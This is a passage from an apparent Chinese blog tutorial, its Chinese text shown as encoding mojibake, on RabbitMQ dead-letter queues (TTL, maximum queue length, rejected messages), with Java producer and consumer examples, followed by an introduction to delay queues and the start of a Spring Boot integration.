·ï¼Œä¸‹æ–‡æœ‰ã€‚ğŸ˜±ğŸ˜±ğŸ˜±ğŸ˜±ï¼‰è®¾ç½®ä½¿ç”¨åˆ°çš„APIä¹Ÿä¸ä¸€æ ·</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.rabbitmq.client.AMQP;<br><span class="hljs-keyword">import</span> com.rabbitmq.client.Channel;<br><span class="hljs-keyword">import</span> io.xtwoy.utils.RabbitMqUtils;<br><br><span class="hljs-keyword">import</span> java.nio.charset.StandardCharsets;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * æ­»ä¿¡é˜Ÿåˆ—ä¹‹ç”Ÿäº§è€…ä»£ç </span><br><span class="hljs-comment"> * [io.xtwoy.dead_letterqueue]</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> : [å¸­å­ä¸ä¼šæ•²ä»£ç ]</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@version</span> : [V1.0]</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@date</span> : [2023/1/12 19:52]</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Producer</span> &#123;<br><br>    <span class="hljs-comment">//æ™®é€šäº¤æ¢æœºçš„åç§°</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">NORMAL_EXCHANGE</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;normal_exchange&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Channel</span> <span class="hljs-variable">channel</span> <span class="hljs-operator">=</span> RabbitMqUtils.getChannel();<br><span class="hljs-comment">//        channel.exchangeDeclare(NORMAL_EXCHANGE, BuiltinExchangeType.DIRECT);</span><br>        <span class="hljs-comment">//æ­»ä¿¡æ¶ˆæ¯ï¼Œè®¾ç½®TTLæ—¶é—´  å•ä½æ˜¯ms  10000msæ˜¯10s</span><br>        AMQP.<span class="hljs-type">BasicProperties</span> <span class="hljs-variable">properties</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AMQP</span>.BasicProperties().builder().expiration(<span class="hljs-string">&quot;1000&quot;</span>).build();<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">message</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;info&quot;</span> + i;<br>            channel.basicPublish(NORMAL_EXCHANGE,<span class="hljs-string">&quot;zhangsan&quot;</span>,<span class="hljs-literal">null</span>,message.getBytes(StandardCharsets.UTF_8));<br>        &#125;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">message</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;info&quot;</span> + i;<br>            channel.basicPublish(NORMAL_EXCHANGE,<span class="hljs-string">&quot;zhangsan&quot;</span>,properties,message.getBytes(StandardCharsets.UTF_8));<br>        &#125;<br><br>        properties = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AMQP</span>.BasicProperties().builder().expiration(<span class="hljs-string">&quot;100000&quot;</span>).build();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">message</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;info&quot;</span> + i;<br>            channel.basicPublish(NORMAL_EXCHANGE,<span class="hljs-string">&quot;zhangsan&quot;</span>,properties,message.getBytes(StandardCharsets.UTF_8));<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><blockquote><p>é˜Ÿåˆ—è¾¾åˆ°æœ€å¤§é•¿åº¦</p></blockquote><ol><li><p>æ¶ˆæ¯ç”Ÿäº§è€…ä»£ç å»æ‰ TTL å±æ€§</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Producer</span> &#123;<br><br>    <span class="hljs-comment">//æ™®é€šäº¤æ¢æœºçš„åç§°</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">NORMAL_EXCHANGE</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;normal_exchange&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Channel</span> <span class="hljs-variable">channel</span> <span class="hljs-operator">=</span> RabbitMqUtils.getChannel();<br><span class="hljs-comment">//        channel.exchangeDeclare(NORMAL_EXCHANGE, BuiltinExchangeType.DIRECT);</span><br>        <span class="hljs-comment">//æ­»ä¿¡æ¶ˆæ¯ï¼Œè®¾ç½®TTLæ—¶é—´  å•ä½æ˜¯ms  10000msæ˜¯10s</span><br>        AMQP.<span class="hljs-type">BasicProperties</span> <span class="hljs-variable">properties</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AMQP</span>.BasicProperties().builder().expiration(<span class="hljs-string">&quot;1000&quot;</span>).build();<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">message</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;info&quot;</span> + i;<br>            channel.basicPublish(NORMAL_EXCHANGE,<span class="hljs-string">&quot;zhangsan&quot;</span>,<span class="hljs-literal">null</span>,message.getBytes(StandardCharsets.UTF_8));<br>        &#125;<br><br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>æ¶ˆè´¹è€…</p><ul><li><p>æ¶ˆè´¹è€…01 æ¶ˆè´¹è€…ä¿®æ”¹ä»¥ä¸‹ä»£ç (<strong>å¯åŠ¨ä¹‹åå…³é—­è¯¥æ¶ˆè´¹è€… æ¨¡æ‹Ÿå…¶æ¥æ”¶ä¸åˆ°æ¶ˆæ¯</strong>)</p></li><li><p><strong><mark>æ³¨æ„æ­¤æ—¶éœ€è¦æŠŠåŸå…ˆé˜Ÿåˆ—åˆ é™¤ å› ä¸ºå‚æ•°æ”¹å˜äº†</mark></strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//è¿‡æœŸæ—¶é—´</span><br><span class="hljs-comment">//        arguments.put(&quot;x-message-ttl&quot;, 10000);</span><br>        <span class="hljs-comment">//æ­£å¸¸é˜Ÿåˆ—è®¾ç½®æ­»ä¿¡é˜Ÿåˆ—</span><br>        arguments.put(<span class="hljs-string">&quot;x-dead-letter-exchange&quot;</span>, DEAD_EXCHANGE);<br>        <span class="hljs-comment">//è®¾ç½®æ­»ä¿¡RoutingKey</span><br>        arguments.put(<span class="hljs-string">&quot;x-dead-letter-routing-key&quot;</span>, <span class="hljs-string">&quot;lisi&quot;</span>);<br>        <span class="hljs-comment">//è®¾ç½®é˜Ÿåˆ—æœ€é•¿é•¿åº¦</span><br>        arguments.put(<span class="hljs-string">&quot;x-max-length&quot;</span>, <span class="hljs-number">6</span>);<br></code></pre></td></tr></table></figure></li><li><p>æ¶ˆè´¹è€…02æ— éœ€åšä¿®æ”¹</p></li></ul></li><li><p>æ•ˆæœï¼š</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230112211459716.png" alt="image-20230112211459716" /></p></li></ol><blockquote><p>æ¶ˆæ¯è¢«æ‹’ç»</p></blockquote><ol><li><p>ç”Ÿäº§è€…ä»£ç æ— æ”¹å˜</p></li><li><p>æ¶ˆè´¹è€…ï¼š</p><ul><li><p>C1 æ¶ˆè´¹è€…ä»£ç (<strong>å¯åŠ¨ä¹‹åå…³é—­è¯¥æ¶ˆè´¹è€… æ¨¡æ‹Ÿå…¶æ¥æ”¶ä¸åˆ°æ¶ˆæ¯</strong>)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Consumer01</span> &#123;<br>    <span class="hljs-comment">//æ™®é€šäº¤æ¢æœºåç§°</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">NORMAL_EXCHANGE</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;normal_exchange&quot;</span>;<br>    <span class="hljs-comment">//æ­»ä¿¡äº¤æ¢æœºåç§°</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">DEAD_EXCHANGE</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;dead_exchange&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] argv)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Channel</span> <span class="hljs-variable">channel</span> <span class="hljs-operator">=</span> RabbitMqUtils.getChannel();<br>        <span class="hljs-comment">//å£°æ˜æ­»ä¿¡å’Œæ™®é€šäº¤æ¢æœº ç±»å‹ä¸º direct</span><br>        channel.exchangeDeclare(NORMAL_EXCHANGE, BuiltinExchangeType.DIRECT);<br>        channel.exchangeDeclare(DEAD_EXCHANGE, BuiltinExchangeType.DIRECT);<br>        <span class="hljs-comment">//å£°æ˜æ­»ä¿¡é˜Ÿåˆ—</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">deadQueue</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;dead-queue&quot;</span>;<br>        channel.queueDeclare(deadQueue, <span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>, <span class="hljs-literal">null</span>);<br>        <span class="hljs-comment">//æ­»ä¿¡é˜Ÿåˆ—ç»‘å®šæ­»ä¿¡äº¤æ¢æœºä¸ routingkey</span><br>        channel.queueBind(deadQueue, DEAD_EXCHANGE, <span class="hljs-string">&quot;lisi&quot;</span>);<br>        <span class="hljs-comment">//æ­£å¸¸é˜Ÿåˆ—ç»‘å®šæ­»ä¿¡é˜Ÿåˆ—ä¿¡æ¯</span><br>        Map&lt;String, Object&gt; params = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        <span class="hljs-comment">//æ­£å¸¸é˜Ÿåˆ—è®¾ç½®æ­»ä¿¡äº¤æ¢æœº å‚æ•° key æ˜¯å›ºå®šå€¼</span><br>        params.put(<span class="hljs-string">&quot;x-dead-letter-exchange&quot;</span>, DEAD_EXCHANGE);<br>        <span class="hljs-comment">//æ­£å¸¸é˜Ÿåˆ—è®¾ç½®æ­»ä¿¡ routing-key å‚æ•° key æ˜¯å›ºå®šå€¼</span><br>        params.put(<span class="hljs-string">&quot;x-dead-letter-routing-key&quot;</span>, <span class="hljs-string">&quot;lisi&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">normalQueue</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;normal-queue&quot;</span>;<br>        channel.queueDeclare(normalQueue, <span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>, params);<br>        channel.queueBind(normalQueue, NORMAL_EXCHANGE, <span class="hljs-string">&quot;zhangsan&quot;</span>);<br>        System.out.println(<span class="hljs-string">&quot;ç­‰å¾…æ¥æ”¶æ¶ˆæ¯.....&quot;</span>);<br>        <span class="hljs-type">DeliverCallback</span> <span class="hljs-variable">deliverCallback</span> <span class="hljs-operator">=</span> (consumerTag, delivery) -&gt; &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">message</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(delivery.getBody(), <span class="hljs-string">&quot;UTF-8&quot;</span>);<br>            <span class="hljs-keyword">if</span> (message.equals(<span class="hljs-string">&quot;info5&quot;</span>)) &#123;<br>                System.out.println(<span class="hljs-string">&quot;Consumer01 æ¥æ”¶åˆ°æ¶ˆæ¯&quot;</span> + message + <span class="hljs-string">&quot;å¹¶æ‹’ç»ç­¾æ”¶è¯¥æ¶ˆæ¯&quot;</span>);<br>                <span class="hljs-comment">//requeue è®¾ç½®ä¸º false ä»£è¡¨æ‹’ç»é‡æ–°å…¥é˜Ÿ è¯¥é˜Ÿåˆ—å¦‚æœé…ç½®äº†æ­»ä¿¡äº¤æ¢æœºå°†å‘é€åˆ°æ­»ä¿¡é˜Ÿåˆ—ä¸­</span><br>                channel.basicReject(delivery.getEnvelope().getDeliveryTag(), <span class="hljs-literal">false</span>);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                System.out.println(<span class="hljs-string">&quot;Consumer01 æ¥æ”¶åˆ°æ¶ˆæ¯&quot;</span> + message);<br>                channel.basicAck(delivery.getEnvelope().getDeliveryTag(), <span class="hljs-literal">false</span>);<br>            &#125;<br>        &#125;;<br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">autoAck</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;<br>        channel.basicConsume(normalQueue, autoAck, deliverCallback, consumerTag -&gt; &#123;<br>        &#125;);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>æ¶ˆè´¹è€…02ä»£ç æ— æ”¹å˜</p></li></ul></li><li><p>æ•ˆæœ</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230112212031901.png" alt="image-20230112212031901" /></p><p>â€‹</p></li></ol><p>â€‹<strong>å¯åŠ¨æ¶ˆè´¹è€… 1 ç„¶åå†å¯åŠ¨æ¶ˆè´¹è€… 2</strong></p><p>â€‹<img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230112212043601.png" alt="image-20230112212043601" /></p><h3 id="rabbitmqä¸­çš„ttl"><a class="markdownIt-Anchor" href="#rabbitmqä¸­çš„ttl"></a> RabbitMQä¸­çš„TTL</h3><p>TTL æ˜¯ä»€ä¹ˆå‘¢ï¼ŸTTL æ˜¯ RabbitMQ ä¸­ä¸€ä¸ªæ¶ˆæ¯æˆ–è€…é˜Ÿåˆ—çš„å±æ€§ï¼Œè¡¨æ˜ä¸€æ¡æ¶ˆæ¯æˆ–è€…è¯¥é˜Ÿåˆ—ä¸­çš„æ‰€æœ‰</p><p>æ¶ˆæ¯çš„æœ€å¤§å­˜æ´»æ—¶é—´ï¼Œå•ä½æ˜¯æ¯«ç§’ã€‚æ¢å¥è¯è¯´ï¼Œå¦‚æœä¸€æ¡æ¶ˆæ¯è®¾ç½®äº† TTL å±æ€§æˆ–è€…è¿›å…¥äº†è®¾ç½® TTL å±æ€§çš„é˜Ÿåˆ—ï¼Œé‚£ä¹ˆè¿™æ¡æ¶ˆæ¯å¦‚æœåœ¨ TTL è®¾ç½®çš„æ—¶é—´å†…æ²¡æœ‰è¢«æ¶ˆè´¹ï¼Œåˆ™ä¼šæˆä¸º&quot;æ­»ä¿¡&quot;ã€‚å¦‚æœåŒæ—¶é…ç½®äº†é˜Ÿåˆ—çš„ TTL å’Œæ¶ˆæ¯çš„TTLï¼Œé‚£ä¹ˆè¾ƒå°çš„é‚£ä¸ªå€¼å°†ä¼šè¢«ä½¿ç”¨ï¼Œæœ‰ä¸¤ç§æ–¹å¼è®¾ç½® TTLã€‚</p><p><strong>æ¶ˆæ¯è®¾ç½® TTL</strong></p><p>å¦ä¸€ç§æ–¹å¼ä¾¿æ˜¯é’ˆå¯¹æ¯æ¡æ¶ˆæ¯è®¾ç½® TTL</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230112212803386.png" alt="image-20230112212803386" /></p><p><strong>é˜Ÿåˆ—è®¾ç½® TTL</strong></p><p>ç¬¬ä¸€ç§æ˜¯åœ¨åˆ›å»ºé˜Ÿåˆ—çš„æ—¶å€™è®¾ç½®é˜Ÿåˆ—çš„â€œx-message-ttlâ€å±æ€§</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230112212816171.png" alt="image-20230112212816171" /></p><p><strong>ä¸¤è€…çš„åŒºåˆ«</strong></p><p>å¦‚æœè®¾ç½®äº†é˜Ÿåˆ—çš„ TTL å±æ€§ï¼Œé‚£ä¹ˆä¸€æ—¦æ¶ˆæ¯è¿‡æœŸï¼Œå°±ä¼šè¢«é˜Ÿåˆ—ä¸¢å¼ƒ(å¦‚æœé…ç½®äº†æ­»ä¿¡é˜Ÿåˆ—è¢«ä¸¢åˆ°æ­»ä¿¡é˜Ÿåˆ—ä¸­)ï¼Œè€Œç¬¬äºŒç§æ–¹å¼ï¼Œæ¶ˆæ¯å³ä½¿è¿‡æœŸï¼Œä¹Ÿä¸ä¸€å®šä¼šè¢«é©¬ä¸Šä¸¢å¼ƒï¼Œå› ä¸º<strong>æ¶ˆæ¯æ˜¯å¦è¿‡æœŸæ˜¯åœ¨å³å°†æŠ•é€’åˆ°æ¶ˆè´¹è€…****ä¹‹å‰åˆ¤å®šçš„</strong>ï¼Œå¦‚æœå½“å‰é˜Ÿåˆ—æœ‰ä¸¥é‡çš„æ¶ˆæ¯ç§¯å‹æƒ…å†µï¼Œåˆ™å·²è¿‡æœŸçš„æ¶ˆæ¯ä¹Ÿè®¸è¿˜èƒ½å­˜æ´»è¾ƒé•¿æ—¶é—´ï¼›å¦å¤–ï¼Œè¿˜éœ€è¦æ³¨æ„çš„ä¸€ç‚¹æ˜¯ï¼Œå¦‚æœä¸è®¾ç½® TTLï¼Œè¡¨ç¤ºæ¶ˆæ¯æ°¸è¿œä¸ä¼šè¿‡æœŸï¼Œå¦‚æœå°† TTL è®¾ç½®ä¸º 0ï¼Œåˆ™è¡¨ç¤ºé™¤éæ­¤æ—¶å¯ä»¥ç›´æ¥æŠ•é€’è¯¥æ¶ˆæ¯åˆ°æ¶ˆè´¹è€…ï¼Œå¦åˆ™è¯¥æ¶ˆæ¯å°†ä¼šè¢«ä¸¢å¼ƒã€‚</p><h1 id="8-å»¶è¿Ÿé˜Ÿåˆ—"><a class="markdownIt-Anchor" href="#8-å»¶è¿Ÿé˜Ÿåˆ—"></a> 8. å»¶è¿Ÿé˜Ÿåˆ—</h1><blockquote><p>æ¦‚å¿µ</p></blockquote><p>å»¶æ—¶é˜Ÿåˆ—,é˜Ÿåˆ—å†…éƒ¨æ˜¯æœ‰åºçš„ï¼Œæœ€é‡è¦çš„ç‰¹æ€§å°±ä½“ç°åœ¨å®ƒçš„å»¶æ—¶å±æ€§ä¸Šï¼Œå»¶æ—¶é˜Ÿåˆ—ä¸­çš„å…ƒç´ æ˜¯å¸Œæœ›åœ¨æŒ‡å®šæ—¶é—´åˆ°äº†ä»¥åæˆ–ä¹‹å‰å–å‡ºå’Œå¤„ç†ï¼Œç®€å•æ¥è¯´ï¼Œå»¶æ—¶é˜Ÿåˆ—å°±æ˜¯ç”¨æ¥å­˜æ”¾éœ€è¦åœ¨æŒ‡å®šæ—¶é—´è¢«å¤„ç†çš„å…ƒç´ çš„é˜Ÿåˆ—ã€‚</p><blockquote><p>ä½¿ç”¨åœºæ™¯</p></blockquote><ol><li>è®¢å•åœ¨ååˆ†é’Ÿä¹‹å†…æœªæ”¯ä»˜åˆ™è‡ªåŠ¨å–æ¶ˆ</li><li>æ–°åˆ›å»ºçš„åº—é“ºï¼Œå¦‚æœåœ¨åå¤©å†…éƒ½æ²¡æœ‰ä¸Šä¼ è¿‡å•†å“ï¼Œåˆ™è‡ªåŠ¨å‘é€æ¶ˆæ¯æé†’ã€‚</li><li>ç”¨æˆ·æ³¨å†ŒæˆåŠŸåï¼Œå¦‚æœä¸‰å¤©å†…æ²¡æœ‰ç™»é™†åˆ™è¿›è¡ŒçŸ­ä¿¡æé†’ã€‚</li><li>ç”¨æˆ·å‘èµ·é€€æ¬¾ï¼Œå¦‚æœä¸‰å¤©å†…æ²¡æœ‰å¾—åˆ°å¤„ç†åˆ™é€šçŸ¥ç›¸å…³è¿è¥äººå‘˜ã€‚</li><li>é¢„å®šä¼šè®®åï¼Œéœ€è¦åœ¨é¢„å®šçš„æ—¶é—´ç‚¹å‰ååˆ†é’Ÿé€šçŸ¥å„ä¸ªä¸ä¼šäººå‘˜å‚åŠ ä¼šè®®</li></ol><p>è¿™äº›åœºæ™¯éƒ½æœ‰ä¸€ä¸ªç‰¹ç‚¹ï¼Œéœ€è¦åœ¨æŸä¸ªäº‹ä»¶å‘ç”Ÿä¹‹åæˆ–è€…ä¹‹å‰çš„æŒ‡å®šæ—¶é—´ç‚¹å®ŒæˆæŸä¸€é¡¹ä»»åŠ¡ï¼Œå¦‚:å‘ç”Ÿè®¢å•ç”Ÿæˆäº‹ä»¶ï¼Œåœ¨ååˆ†é’Ÿä¹‹åæ£€æŸ¥è¯¥è®¢å•æ”¯ä»˜çŠ¶æ€ï¼Œç„¶åå°†æœªæ”¯ä»˜çš„è®¢å•è¿›è¡Œå…³é—­;çœ‹èµ·æ¥ä¼¼ä¹ä½¿ç”¨å®šæ—¶ä»»åŠ¡ï¼Œä¸€ç›´è½®è¯¢æ•°æ®ï¼Œæ¯ç§’æŸ¥ä¸€æ¬¡ï¼Œå–å‡ºéœ€è¦è¢«å¤„ç†çš„æ•°æ®ï¼Œç„¶åå¤„ç†ä¸å°±å®Œäº‹äº†å—?å¦‚æœæ•°æ®é‡æ¯”è¾ƒå°‘ï¼Œç¡®å®å¯ä»¥è¿™æ ·åšï¼Œæ¯”å¦‚:å¯¹äºâ€œå¦‚æœè´¦å•ä¸€å‘¨å†…æœªæ”¯ä»˜åˆ™è¿›è¡Œè‡ªåŠ¨ç»“ç®—â€è¿™æ ·çš„éœ€æ±‚,å¦‚æœå¯¹äºæ—¶é—´ä¸æ˜¯ä¸¥æ ¼é™åˆ¶ï¼Œè€Œæ˜¯å®½æ¾æ„ä¹‰ä¸Šçš„ä¸€å‘¨ï¼Œé‚£ä¹ˆæ¯å¤©æ™šä¸Šè·‘ä¸ªå®šæ—¶ä»»åŠ¡æ£€æŸ¥ä¸€ä¸‹æ‰€æœ‰æœªæ”¯ä»˜çš„è´¦å•ï¼Œç¡®å®ä¹Ÿæ˜¯ä¸€ä¸ªå¯è¡Œçš„æ–¹æ¡ˆã€‚ä½†å¯¹äºæ•°æ®é‡æ¯”è¾ƒå¤§ï¼Œå¹¶ä¸”æ—¶æ•ˆæ€§è¾ƒå¼ºçš„åœºæ™¯ï¼Œå¦‚:â€œè®¢å•ååˆ†é’Ÿå†…æœªæ”¯ä»˜åˆ™å…³é—­â€œï¼ŒçŸ­æœŸå†…æœªæ”¯ä»˜çš„è®¢å•æ•°æ®å¯èƒ½ä¼šæœ‰å¾ˆå¤šï¼Œæ´»åŠ¨æœŸé—´ç”šè‡³ä¼šè¾¾åˆ°ç™¾ä¸‡ç”šè‡³åƒä¸‡çº§åˆ«ï¼Œå¯¹è¿™ä¹ˆåºå¤§çš„æ•°æ®é‡ä»æ—§ä½¿ç”¨è½®è¯¢çš„æ–¹å¼æ˜¾ç„¶æ˜¯ä¸å¯å–çš„ï¼Œå¾ˆå¯èƒ½åœ¨ä¸€ç§’å†…æ— æ³•å®Œæˆæ‰€æœ‰è®¢å•çš„æ£€æŸ¥ï¼ŒåŒæ—¶ä¼šç»™æ•°æ®åº“å¸¦æ¥å¾ˆå¤§å‹åŠ›ï¼Œæ— æ³•æ»¡è¶³ä¸šåŠ¡è¦æ±‚è€Œä¸”æ€§èƒ½ä½ä¸‹ã€‚</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230112212405491.png" alt="image-20230112212405491" /></p><p>å‰é¢æˆ‘ä»¬ä»‹ç»äº†æ­»ä¿¡é˜Ÿåˆ—ï¼Œåˆšåˆšåˆä»‹ç»äº† TTLï¼Œè‡³æ­¤åˆ©ç”¨ RabbitMQ å®ç°å»¶æ—¶é˜Ÿåˆ—çš„ä¸¤å¤§è¦ç´ å·²ç»é›†é½ï¼Œæ¥ä¸‹æ¥åªéœ€è¦å°†å®ƒä»¬è¿›è¡Œèåˆï¼Œå†åŠ å…¥ä¸€ç‚¹ç‚¹è°ƒå‘³æ–™ï¼Œå»¶æ—¶é˜Ÿåˆ—å°±å¯ä»¥æ–°é²œå‡ºç‚‰äº†ã€‚æƒ³æƒ³çœ‹ï¼Œå»¶æ—¶é˜Ÿåˆ—ï¼Œä¸å°±æ˜¯æƒ³è¦æ¶ˆæ¯å»¶è¿Ÿå¤šä¹…è¢«å¤„ç†å—ï¼ŒTTL åˆ™åˆšå¥½èƒ½è®©æ¶ˆæ¯åœ¨å»¶è¿Ÿå¤šä¹…ä¹‹åæˆä¸ºæ­»ä¿¡ï¼Œå¦ä¸€æ–¹é¢ï¼Œæˆä¸ºæ­»ä¿¡çš„æ¶ˆæ¯éƒ½ä¼šè¢«æŠ•é€’åˆ°æ­»ä¿¡é˜Ÿåˆ—é‡Œï¼Œè¿™æ ·åªéœ€è¦æ¶ˆè´¹è€…ä¸€ç›´æ¶ˆè´¹æ­»ä¿¡é˜Ÿåˆ—é‡Œçš„æ¶ˆæ¯å°±å®Œäº‹äº†ï¼Œå› ä¸ºé‡Œé¢çš„æ¶ˆæ¯éƒ½æ˜¯å¸Œæœ›è¢«ç«‹å³å¤„ç†çš„æ¶ˆæ¯ã€‚</p><h2 id="81-æ•´åˆspringboot"><a class="markdownIt-Anchor" href="#81-æ•´åˆspringboot"></a> 8.1 æ•´åˆSpringboot</h2><ol><li><p>XML</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 